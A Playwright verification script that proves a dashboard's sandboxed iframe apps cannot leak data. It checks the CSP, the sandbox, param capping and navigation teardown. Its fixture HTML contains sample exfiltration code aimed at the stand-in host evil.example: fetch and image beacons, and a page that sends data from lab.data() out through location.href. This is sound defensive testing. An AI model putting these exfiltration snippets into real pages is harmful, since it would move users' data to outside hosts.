#!/usr/bin/env node
/**
 * app/v1 multi-page insight — runtime proof.
 *
 *   npm run build && npm run verify:lab-app
 *
 * Boots the REAL dashboard server on an isolated scratch vault (fake HOME, no
 * user state, no network sources — the insight is a local script), drives it
 * with Playwright, and proves what the unit suite (T1-T7, already landed)
 * cannot:
 *
 *   1. the app frame's sandbox is exactly `allow-scripts` and its srcdoc
 *      carries `default-src 'none'` — same two constants as html/v1, reused
 *      via `buildSandboxSrcdoc`, not re-implemented;
 *   2. a fetch + <img> beacon in the same page's inline script produce ZERO
 *      network requests while the script itself demonstrably runs — the same
 *      accounting scripts/verify/lab-breakdown-reports.mjs already does;
 *   3. the CARD iframe's height GROWS as content grows and is never the old
 *      fixed 232/420 card/detail heights;
 *   4. the host<->iframe bridge: `lab.data()` returns rows the page's own
 *      html never embedded (host-served, never fetched);
 *   5. `lab.navigate('steps')` changes the URL to `/lab/<slug>/p/steps`, and
 *      the browser Back button returns to the entry page;
 *   6. a COLD deep-link straight to `/lab/<slug>/p/steps` lands on that page
 *      (no click-through needed);
 *   7. `?fs=1` deep-links into full-screen and Escape exits it;
 *   8. the CLI answers `lab query` and `lab body` from the cache alone, with
 *      no dashboard process involved;
 *   9. SELF-NAVIGATION TEARDOWN: a page that calls `lab.data()` and then
 *      `location.href`s itself to an external host reaches the visible
 *      "stopped" state (M1 — load-count teardown) and the shipped guard that
 *      makes the host stop posting is pinned at the source level (see the
 *      NOTE below on what is and is not E2E-observable here);
 *  10. MALICIOUS PARAMS — WRITE path: a `lab.navigate('steps', {...})` call
 *      carrying an oversized value and 26 extra keys is capped to <=8
 *      `p.`-namespaced params, no value over 64 chars, <=256 chars of query
 *      growth — and Copy-link yields exactly that capped URL, never the raw
 *      payload. MALICIOUS PARAMS — READ path: the SAME guarantees hold for a
 *      crafted deep link that never went through `lab.navigate()` at all — a
 *      hand-typed, bookmarked, or attacker-shared URL, sanitized by
 *      `readAppParams` on load rather than by `pushLabAppPath` on write.
 *
 * NOTE on check 9's "host posts nothing after teardown" sub-claim: the
 * mechanism is `LabAppFrame.tsx`'s `postToFrame` returning before it ever
 * touches `frameRef`/`contentWindow` once `tornRef.current` is set. That
 * early-return cannot be independently instrumented from OUTSIDE the
 * browser's cross-origin boundary in a black-box Playwright script — `name`
 * is not on the cross-origin-readable Window property list, a torn/opaque
 * origin frame cannot be monkey-patched from the parent realm, and Chromium
 * exposes no CDP domain for postMessage traffic. Modifying the shipped
 * component to add a test-only observation hook is out of scope for this
 * task (T8 owns only this script + package.json). So this script proves the
 * two things that ARE genuinely observable — (a) the visible stopped state
 * appears and stays put, (b) the shipped guard code exists exactly where the
 * runtime contract requires it (a source pin, not a dynamic interception) —
 * and reports the navigation attempt's real network outcome as INFO, never
 * as the security guarantee itself. See the final summary for how this adds
 * up against item 9 as specified.
 *
 * Same harness contract as the other verify scripts: real server, isolated
 * fake HOME, COLLECT-DON'T-FAIL-FAST reporting. Screenshots land in
 * <scratch>/shots for eyeballing. `evil.example` (RFC 2606 — guaranteed never
 * to resolve) is additionally pinned to localhost via a Chromium
 * host-resolver rule so the self-navigation check fails fast and never
 * touches the real network.
 */

import { spawn, execFileSync, execFile } from 'node:child_process';
import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';
import { chromium } from 'playwright';

const execFileAsync = promisify(execFile);

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const SCRATCH = join(tmpdir(), 'dreamcontext-verify-lab-app');
const HOME = join(SCRATCH, 'home');
const PROJ = join(SCRATCH, 'proj');
const SHOTS = join(SCRATCH, 'shots');
const PORT = 45749;
const CLI = join(REPO, 'dist', 'index.js');
const LAB = join(PROJ, '_dream_context', 'lab');
const SLUG = 'lab-app-demo';
const ORIGIN = `http://127.0.0.1:${PORT}`;

const results = [];
const ok = (name, cond, detail = '') => results.push(`${cond ? 'PASS' : 'FAIL'} ${name}${detail && !cond ? ` — ${detail}` : ''}`);
const info = (name, detail) => results.push(`INFO ${name} — ${detail}`);

function dc(args, opts = {}) {
  return execFileSync('node', [CLI, ...args], {
    cwd: PROJ, env: { ...process.env, HOME }, stdio: ['ignore', 'pipe', 'pipe'], ...opts,
  }).toString();
}

async function dcAsync(args) {
  const { stdout } = await execFileAsync('node', [CLI, ...args], { cwd: PROJ, env: { ...process.env, HOME } });
  return stdout;
}

// ── Fixture: one app/v1 insight, three pages ────────────────────────────────
//
// `overview` (entry + card): a beacon (fetch + <img>, same exfiltration
// attempt lab-breakdown-reports.mjs proves is CSP-blocked) plus a table
// filled ONLY from `lab.data()` after a deliberate 700ms delay — the delay
// makes the "small, then grows" height transition deterministically
// observable instead of racing a near-instant round trip. Buttons drive the
// navigate() checks (5/6/10).
// `steps`: the navigate() target — a heading + list (also exercised by
// `lab body --format md`) that echoes whatever params it actually received,
// so the capped-params proof (10) covers the app's own view, not just the URL.
// `leak`: unlinked, deep-link-only — self-navigates to a sentinel host with
// data `lab.data()` returned, for the teardown proof (9).

const OVERVIEW_HTML = [
  '<div class="lk-stat"><span class="lk-label">Growth</span><span class="lk-value" id="v">0</span></div>',
  '<table class="lk-table" id="tbl"><thead><tr><th>Row</th><th class="lk-num">Value</th></tr></thead><tbody id="tbody"></tbody></table>',
  '<div class="lk-row" style="margin-top:8px">',
  '<button class="lk-chip" id="goSteps">Go to steps</button>',
  '<button class="lk-chip" id="leakParams">Leak params</button>',
  '</div>',
  '<script>',
  'document.getElementById("v").dataset.ran = "1";',
  'try { fetch("https://evil.example/beacon"); } catch (e) {}',
  'var img = new Image(); img.src = "https://evil.example/pixel.gif";',
  'lab.data("growth").then(function (ds) {',
  '  setTimeout(function () {',
  '    var tbody = document.getElementById("tbody");',
  '    ds.rows.forEach(function (row) {',
  '      var tr = document.createElement("tr");',
  '      tr.innerHTML = "<td>" + row.d.row + "</td><td class=\\"lk-num\\">" + row.v + "</td>";',
  '      tbody.appendChild(tr);',
  '    });',
  '    document.getElementById("v").textContent = String(ds.rows.length);',
  '    document.getElementById("v").dataset.rows = String(ds.rows.length);',
  '  }, 700);',
  '});',
  'document.getElementById("goSteps").addEventListener("click", function () {',
  '  lab.navigate("steps", { from: "overview" });',
  '});',
  'document.getElementById("leakParams").addEventListener("click", function () {',
  '  var leak = "";',
  '  for (var i = 0; i < 100; i++) leak += "XLEAKDATA0123456789";', // ~2000 chars
  '  var params = { leak: leak };',
  '  var letters = "abcdefghijklmnopqrstuvwxyz";',
  '  for (var j = 0; j < letters.length; j++) params[letters[j]] = String(j + 1);',
  '  lab.navigate("steps", params);',
  '});',
  '<\/script>',
].join('\n');

const STEPS_HTML = [
  '<h2 class="lk-title">Steps</h2>',
  '<ul><li>First step</li><li>Second step</li><li>Third step</li></ul>',
  '<div class="lk-muted" id="paramsOut">params: (none yet)</div>',
  '<script>',
  'function render(p) { document.getElementById("paramsOut").textContent = "params: " + JSON.stringify(p); }',
  'render(lab.params);',
  'lab.onRoute(function (page, params) { render(params); });',
  '<\/script>',
].join('\n');

const LEAK_HTML = [
  '<div class="lk-stat"><span class="lk-label">Leak</span><span class="lk-value" id="v">idle</span></div>',
  '<script>',
  'lab.data().then(function (ds) {',
  '  document.getElementById("v").textContent = "got-data";',
  '  document.getElementById("v").dataset.ran = "1";',
  '  location.href = "https://evil.example/?d=" + encodeURIComponent(JSON.stringify(ds));',
  '});',
  '<\/script>',
].join('\n');

const APP_SCRIPT = `export default async function fetchApp(ctx) {
  var rows = [];
  for (var i = 1; i <= 10; i++) rows.push({ d: { row: 'r' + i }, v: i * 111 });
  return {
    data: {
      kind: 'dataset/v1',
      primary: 'growth',
      datasets: [
        { key: 'growth', dims: [{ key: 'row' }], rows: rows, total: { v: 6105 } },
        {
          key: 'breakdown',
          dims: [{ key: 'funnel', label: 'Funnel' }, { key: 'language', label: 'Language' }],
          rows: [
            { d: { funnel: 'F3000', language: 'TR' }, v: 119000, n: 4200 },
            { d: { funnel: 'F3000', language: 'EN' }, v: 84000, n: 3100 },
            { d: { funnel: 'F4000', language: 'TR' }, v: 52000, n: 1800 },
          ],
          total: { v: 255000, n: 9100 },
        },
      ],
    },
    app: {
      kind: 'app/v1',
      entry: 'overview',
      card: 'overview',
      pages: [
        { id: 'overview', title: 'Overview', html: ${JSON.stringify(OVERVIEW_HTML)} },
        { id: 'steps', title: 'Steps', html: ${JSON.stringify(STEPS_HTML)}, dataset: 'breakdown' },
        { id: 'leak', title: 'Leak (test)', html: ${JSON.stringify(LEAK_HTML)} },
      ],
    },
  };
}`;

function setup() {
  rmSync(SCRATCH, { recursive: true, force: true });
  mkdirSync(join(PROJ, '_dream_context', 'state'), { recursive: true });
  mkdirSync(join(HOME, '.dreamcontext'), { recursive: true });
  mkdirSync(SHOTS, { recursive: true });
  writeFileSync(join(HOME, '.dreamcontext', '.secrets.json'), JSON.stringify({ github: { token: 'gho_fake_verify_token', login: 'verify-user' } }));
  execFileSync('git', ['init', '-q'], { cwd: PROJ });
  dc(['vaults', 'add', 'proj', PROJ], { cwd: REPO });
  try { dc(['init', '--yes']); } catch { /* scaffold best-effort — lab only needs lab/ */ }

  mkdirSync(join(LAB, 'scripts'), { recursive: true });
  dc(['lab', 'create', SLUG, '--title', 'Lab App Demo', '--render', 'app', '--adapter', 'script', '--group', 'Verify']);
  writeFileSync(join(LAB, 'scripts', `${SLUG}.mjs`), `${APP_SCRIPT}\n`, 'utf-8');
  dc(['lab', 'sync', SLUG]);
}

async function waitForServer(url, ms = 20000) {
  const until = Date.now() + ms;
  while (Date.now() < until) {
    try { const r = await fetch(url); if (r.ok) return; } catch { /* not up yet */ }
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error(`server did not come up at ${url}`);
}

const cardOf = (page, title) => page.locator('.lab-card', { hasText: title }).first();

async function main() {
  setup();
  const server = spawn('node', [CLI, 'dashboard', '--no-open', '-p', String(PORT)], {
    cwd: PROJ, env: { ...process.env, HOME, DREAMCONTEXT_DESKTOP: '1' }, stdio: 'ignore',
  });
  try {
    await waitForServer(`http://127.0.0.1:${PORT}/api/lab`);

    // `evil.example` (RFC 2606) is guaranteed never to resolve in the real
    // world; pinning it to localhost keeps check 9's self-navigation attempt
    // fast and fully offline (nothing listens on 127.0.0.1:443, so it fails
    // with an immediate connection error instead of a real DNS round trip).
    const browser = await chromium.launch({ args: ['--host-resolver-rules=MAP evil.example 127.0.0.1'] });
    const context = await browser.newContext({ viewport: { width: 1600, height: 1000 } });
    await context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: ORIGIN });
    const page = await context.newPage();

    // Exfiltration accounting — same contract as lab-breakdown-reports.mjs:
    // nothing may FINISH, and every registered subresource attempt must die
    // with the `csp` block reason. Scoped separately from the navigation
    // request check 9 records (a top-level frame navigation is not a
    // "beacon" in this accounting).
    let escaped = 0;
    let cspBlocked = 0;
    page.on('requestfinished', (req) => {
      if (req.url().includes('evil.example') && !req.isNavigationRequest()) escaped += 1;
    });
    page.on('requestfailed', (req) => {
      if (!req.url().includes('evil.example') || req.isNavigationRequest()) return;
      if (req.failure()?.errorText === 'csp') cspBlocked += 1;
      else escaped += 1;
    });

    const shoot = async (name) => page.screenshot({ path: join(SHOTS, `${name}.png`), fullPage: true });

    await page.goto(`${ORIGIN}/?vault=proj`, { waitUntil: 'networkidle' });
    if (await page.locator('.announcements-modal-scrim').count()) {
      await page.keyboard.press('Escape');
      await page.waitForTimeout(300);
    }
    await page.getByText('Insights', { exact: true }).first().click();

    // ── 1 & 2. sandbox + CSP + beacon accounting, on the CARD ──────────────
    const card = cardOf(page, 'Lab App Demo');
    const cardFrameEl = card.locator('iframe.lab-app-frame');
    // Wait for the iframe to ATTACH, not a fixed sleep — the fixture starts
    // its own 700ms row-fill timer the instant its srcdoc's script runs, so
    // any fixed wait here that is >=700ms would already land past the fill
    // and make "before" and "after" the same number (the bug this replaces).
    await cardFrameEl.waitFor({ state: 'attached', timeout: 10000 });
    ok('card renders the app frame', await cardFrameEl.count() === 1);
    ok('card iframe sandbox is exactly allow-scripts', await cardFrameEl.getAttribute('sandbox') === 'allow-scripts');
    const cardSrcdoc = (await cardFrameEl.getAttribute('srcdoc')) ?? '';
    ok('card srcdoc embeds the no-network CSP', cardSrcdoc.includes("default-src 'none'"));
    ok('card srcdoc does NOT embed the growth rows (bridge-fed, not baked in)', !cardSrcdoc.includes('1110'));

    // ── 3 (part 1). height BEFORE the fixture's deliberate 700ms row-fill ──
    // Captured immediately on attach — comfortably inside the fill delay, so
    // this is genuinely the pre-growth height, not a race against it.
    const heightBefore = (await cardFrameEl.boundingBox())?.height ?? 0;
    ok('initial card height is the small pre-data state', heightBefore > 0 && heightBefore < 300, `${heightBefore}px`);
    await shoot('board');

    const cardFrame = page.frameLocator('iframe.lab-app-frame');
    ok('the inline script RAN (kit is usable)', await cardFrame.locator('#v').getAttribute('data-ran') === '1');
    // Now cross the fill delay — this wait runs AFTER heightBefore was
    // already captured, so it is safe for it to exceed 700ms.
    await page.waitForTimeout(900);
    ok('no beacon reached the network (fetch killed pre-request, img blocked by CSP)',
      escaped === 0, `${escaped} beacon(s) escaped`);
    ok('the img beacon attempt died with the csp block reason', cspBlocked >= 1,
      `${cspBlocked} csp-blocked (expected >=1)`);

    // ── 4. bridge round trip: lab.data() delivers rows the html never had ──
    // The engine caps a single dimension's cardinality at MAX_MATRIX_DIM_VALUES
    // (8, matrix.ts) — collapsing the tail into one "Other" row. The fixture's
    // `growth` dataset declares 10 distinct `row` values, so the CACHED (and
    // therefore bridge-delivered) dataset legitimately holds 9 rows: the top 8
    // by value plus one collapsed "Other". This is the shipped contract, not a
    // fixture bug — do not "fix" this back to 10.
    ok('lab.data() delivered the (capped) row count (host-served, not embedded)',
      await cardFrame.locator('#v').getAttribute('data-rows') === '9');
    ok('the delivered VALUES appear only after the bridge round trip',
      (await cardFrame.locator('#tbody').innerText()).includes('1110'));

    const heightAfter = (await cardFrameEl.boundingBox())?.height ?? 0;
    ok('card height GREW once the bridge-fed table rendered', heightAfter > heightBefore,
      `before=${heightBefore}px after=${heightAfter}px`);
    ok('height is not the old fixed html/v1 card height (232px)', Math.round(heightAfter) !== 232);
    ok('height is not the old fixed html/v1 detail height (420px)', Math.round(heightAfter) !== 420);
    await shoot('card-grown');

    // ── open the routed app page (card click -> isRoutedRender) ────────────
    await card.locator('.lab-card-title').click();
    await page.waitForTimeout(900);
    ok('the card click routed to /lab/<slug> (entry page)',
      new URL(page.url()).pathname === `/lab/${SLUG}`, page.url());
    await shoot('page-overview');

    // ── 5. lab.navigate('steps') changes the URL; Back returns to entry ────
    const pageFrame = () => page.frameLocator('iframe.lab-app-frame');
    await pageFrame().locator('#goSteps').click();
    await page.waitForTimeout(700);
    ok('lab.navigate("steps") routed to /lab/<slug>/p/steps',
      new URL(page.url()).pathname === `/lab/${SLUG}/p/steps`, page.url());
    ok('the steps page rendered (heading visible)',
      (await pageFrame().locator('.lk-title').innerText()) === 'Steps');
    await shoot('page-steps');

    await page.goBack();
    await page.waitForTimeout(700);
    ok('browser Back returned to the entry page',
      new URL(page.url()).pathname === `/lab/${SLUG}`, page.url());

    // ── 6. a COLD deep-link straight to the steps page ──────────────────────
    await page.goto(`${ORIGIN}/lab/${SLUG}/p/steps?vault=proj`, { waitUntil: 'networkidle' });
    await page.waitForTimeout(700);
    ok('cold deep-link to /p/steps lands directly on that page (no click-through)',
      await pageFrame().locator('.lk-title').count() === 1
      && (await pageFrame().locator('.lk-title').innerText()) === 'Steps');
    await shoot('cold-deep-link-steps');

    // ── 7. ?fs=1 deep-links into full-screen; Escape exits ──────────────────
    await page.goto(`${ORIGIN}/lab/${SLUG}?fs=1&vault=proj`, { waitUntil: 'networkidle' });
    await page.waitForTimeout(700);
    ok('?fs=1 deep-linked straight into full screen', await page.locator('.lab-app-page--fullscreen').count() === 1);
    await page.keyboard.press('Escape');
    await page.waitForTimeout(400);
    ok('Escape exited full screen', await page.locator('.lab-app-page--fullscreen').count() === 0);
    ok('the fs param was cleared from the URL', !page.url().includes('fs=1'));
    await shoot('fullscreen-exited');

    // ── 10. malicious navigate() params are capped before they reach the URL ─
    await page.goto(`${ORIGIN}/lab/${SLUG}?vault=proj`, { waitUntil: 'networkidle' });
    await page.waitForTimeout(700);
    await pageFrame().locator('#leakParams').click();
    await page.waitForTimeout(700);
    const leakUrl = new URL(page.url());
    ok('malicious navigate() still routed to the target page',
      leakUrl.pathname === `/lab/${SLUG}/p/steps`, leakUrl.href);
    const pParams = [...leakUrl.searchParams.entries()].filter(([k]) => k.startsWith('p.'));
    ok('no more than 8 p.* params survived', pParams.length > 0 && pParams.length <= 8, `${pParams.length} params`);
    ok('the oversized "leak" value was dropped entirely (never truncated-in)',
      !pParams.some(([k]) => k === 'p.leak'));
    ok('every surviving value is <=64 chars', pParams.every(([, v]) => v.length <= 64));
    const totalGrowth = pParams.reduce((sum, [k, v]) => sum + k.length + v.length, 0);
    ok('total surviving param size stays <=256 chars', totalGrowth <= 256, `${totalGrowth} chars`);
    ok('the steps page itself only received the capped params (not the leak)',
      !(await pageFrame().locator('#paramsOut').innerText()).includes('XLEAKDATA'));

    const copyBtn = page.locator('.lab-app-page-action', { hasText: 'Copy link' });
    await copyBtn.click();
    await page.waitForTimeout(300);
    const clipboardText = await page.evaluate(() => navigator.clipboard.readText());
    ok('Copy-link yields EXACTLY the capped, currently-shown URL',
      clipboardText === page.url(), `clipboard="${clipboardText}" url="${page.url()}"`);
    ok('the copied link does not carry the leak payload', !clipboardText.includes('XLEAKDATA'));
    await shoot('capped-params');

    // ── 10b. READ path: a crafted deep link, never through lab.navigate() ──
    // The write-path battery above proves `pushLabAppPath` caps a script's
    // own `lab.navigate()` call. A hand-typed, bookmarked, or attacker-shared
    // URL never goes through that function at all — it lands straight in the
    // query string and `readAppParams` is what turns it into the params an
    // app page actually receives. Same guarantees, same fixture shape
    // ("XLEAKDATA..." + a..z), driven via a COLD `page.goto` instead of a
    // click so `pushLabAppPath`/`sanitizeAppParams` on the write side are
    // never invoked for this check.
    {
      const readLeak = 'XLEAKDATA0123456789'.repeat(100); // ~2000 chars, matches the write-path fixture
      const craftedParams = new URLSearchParams({ vault: 'proj', 'p.leak': readLeak });
      const letters = 'abcdefghijklmnopqrstuvwxyz';
      for (let j = 0; j < letters.length; j++) craftedParams.set(`p.${letters[j]}`, String(j + 1));
      const craftedUrl = `${ORIGIN}/lab/${SLUG}/p/steps?${craftedParams.toString()}`;

      await page.goto(craftedUrl, { waitUntil: 'networkidle' });
      await page.waitForTimeout(900);

      ok('READ path: cold deep-link landed on the requested page',
        new URL(page.url()).pathname === `/lab/${SLUG}/p/steps`, page.url());
      const readUrl = new URL(page.url());
      const readParams = [...readUrl.searchParams.entries()].filter(([k]) => k.startsWith('p.'));
      ok('READ path: at most 8 p.* params reach the app', readParams.length > 0 && readParams.length <= 8,
        `${readParams.length} params — url="${readUrl.href}"`);
      ok('READ path: the oversized "leak" value is absent, not truncated-in',
        !readParams.some(([k]) => k === 'p.leak'));
      ok('READ path: every surviving value is <=64 chars', readParams.every(([, v]) => v.length <= 64));
      const readTotal = readParams.reduce((sum, [k, v]) => sum + k.length + v.length, 0);
      ok('READ path: total surviving param size stays <=256 chars', readTotal <= 256, `${readTotal} chars`);
      ok('READ path: the steps page itself only received capped params (not the leak)',
        !(await pageFrame().locator('#paramsOut').innerText()).includes('XLEAKDATA'));

      const readCopyBtn = page.locator('.lab-app-page-action', { hasText: 'Copy link' });
      await readCopyBtn.click();
      await page.waitForTimeout(300);
      const readClipboard = await page.evaluate(() => navigator.clipboard.readText());
      ok('READ path: Copy-link yields the CAPPED url, not the crafted raw one',
        readClipboard === page.url(), `clipboard="${readClipboard}"`);
      ok('READ path: the copied link does not carry the leak payload', !readClipboard.includes('XLEAKDATA'));
      await shoot('capped-params-read-path');
    }

    // ── 9. self-navigation teardown ──────────────────────────────────────
    let navAttempted = false;
    let navOutcome = 'never observed';
    page.on('request', (req) => {
      if (req.url().startsWith('https://evil.example/') && req.isNavigationRequest()) navAttempted = true;
    });
    page.on('requestfailed', (req) => {
      if (req.url().startsWith('https://evil.example/') && req.isNavigationRequest()) {
        navOutcome = `failed: ${req.failure()?.errorText ?? 'unknown'}`;
      }
    });
    page.on('requestfinished', (req) => {
      if (req.url().startsWith('https://evil.example/') && req.isNavigationRequest()) navOutcome = 'finished (!)';
    });

    await page.goto(`${ORIGIN}/lab/${SLUG}/p/leak?vault=proj`, { waitUntil: 'networkidle' });
    await page.waitForTimeout(2500); // lab.data() round trip + navigation attempt + load-count teardown

    const stopped = page.locator('.lab-app-frame-message--stopped');
    ok('the app frame reached the visible STOPPED state', await stopped.count() === 1);
    ok('the stopped state names what happened',
      (await stopped.innerText()).includes('navigated away and was stopped'));
    // Durability: still stopped a moment later — no accidental resurrection.
    await page.waitForTimeout(500);
    ok('the stopped state is durable (did not revert or re-render content)',
      await stopped.count() === 1 && (await stopped.innerText()).includes('navigated away and was stopped'));
    await shoot('leak-stopped');

    info('self-navigation attempt to evil.example', navAttempted
      ? `attempted; network outcome: ${navOutcome} (a Chromium-level block here is a bonus, not the guarantee — see the module doc)`
      : 'not observed as a distinct navigation request (Chromium may have folded it into the frame\'s own load); the visible teardown above is the binding proof either way');

    // Source pin — the exact guard the runtime contract requires, checked
    // mechanically against the SHIPPED file rather than re-derived from
    // memory. See the module doc for why this stands in for a dynamic
    // interception that is not reachable from outside the sandbox boundary.
    const frameSrc = readFileSync(join(REPO, 'dashboard/src/components/lab/LabAppFrame.tsx'), 'utf-8');
    ok('source pin: postToFrame early-returns on tornRef before touching the frame',
      /postToFrame[\s\S]{0,80}if \(tornRef\.current\) return;/.test(frameSrc));
    ok('source pin: inbound gate checks event.source identity before anything else',
      /event\.source !== frameRef\.current\?\.contentWindow/.test(frameSrc));
    const runtimeSrc = readFileSync(join(REPO, 'dashboard/src/components/lab/labAppRuntime.ts'), 'utf-8');
    ok('source pin: inbound gate checks the per-instance nonce',
      /data\.nonce !== NONCE/.test(runtimeSrc));

    // ── 8. CLI answers with no dashboard involved ───────────────────────────
    const queryOut = await dcAsync(['lab', 'query', SLUG, '--dataset', 'breakdown', '--where', 'funnel=F3000']);
    ok('lab query --where filters to the matching rows', queryOut.includes('TR') && queryOut.includes('EN') && !queryOut.includes('F4000'));
    ok('lab query reports the "as of" stamp (cache-only, honest)', queryOut.includes('as of'));

    const bodyOut = await dcAsync(['lab', 'body', SLUG, '--page', 'steps', '--format', 'md']);
    ok('lab body --page steps --format md extracts the page content', bodyOut.includes('Steps') && bodyOut.includes('First step'));

    await browser.close();
  } finally {
    server.kill('SIGTERM');
  }

  const failed = results.filter((r) => r.startsWith('FAIL'));
  console.log(results.join('\n'));
  console.log(`\n${results.length - failed.length}/${results.length} PASS/INFO checks (${failed.length} FAIL). Shots: ${SHOTS}`);
  process.exit(failed.length === 0 ? 0 : 1);
}

main().catch((err) => {
  console.error(err);
  console.log(results.join('\n'));
  process.exit(1);
});
